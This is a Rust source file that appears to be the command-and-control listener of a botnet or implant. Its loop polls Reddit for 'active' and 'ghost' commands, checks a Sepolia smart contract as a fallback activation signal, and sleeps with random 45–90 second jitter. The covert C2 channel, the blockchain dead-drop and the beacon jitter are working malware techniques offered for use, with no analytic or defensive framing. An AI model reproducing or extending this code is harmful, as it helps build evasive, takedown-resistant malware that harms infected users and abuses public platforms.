use super::state::{CommandState, SystemMode};
use crate::n::bootstrap::reddit::RedditProvider;
use crate::d::eth_listener::check_sepolia_fallback;
use log::{info, debug, warn};
use std::time::Duration;
use rand::Rng;
use smol::Timer;

pub fn start_listener(state: CommandState) {
    smol::spawn(async move {
        let reddit = RedditProvider;
        info!("[C2] Starting Ghost Mode Listener (Reddit + Sepolia)...");
        crate::k::debug::log_op!("C2", "Listener Started (Ghost Mode)");

        loop {
            // calculated jitter
            // 1. Poll Reddit
            match reddit.poll_command() {
                Some(cmd) => {
                    if cmd == "active" {
                         if state.set_mode(SystemMode::Active) {
                             info!("[C2] REDDIT COMMAND: ACTIVATE NETWORK");
                         }
                    } else if cmd == "ghost" {
                        if state.set_mode(SystemMode::Ghost) {
                             info!("[C2] REDDIT COMMAND: ENTER GHOST MODE");
                        }
                    }
                }
                None => {
                    debug!("[C2] No command found on Reddit.");
                    crate::k::debug::log_detail!("Reddit Poll: No Command.");
                }
            }

            // 2. Poll Sepolia (Smart Contract)
            // If we get valid peers, it implies valid signature -> Active
            if let Some((_peers, _)) = check_sepolia_fallback().await {
                if state.set_mode(SystemMode::Active) {
                    info!("[C2] SEPOLIA SIGNAL: ACTIVATE NETWORK");
                }
            }

            // 3. Sleep with jitter
            // 3. Sleep with jitter (45s - 90s)
            let jitter = rand::thread_rng().gen_range(45..90);
            
            crate::k::debug::log_op!("C2", format!("Sleeping {}s...", jitter));
            Timer::after(Duration::from_secs(jitter)).await;
        }
    }).detach();
}
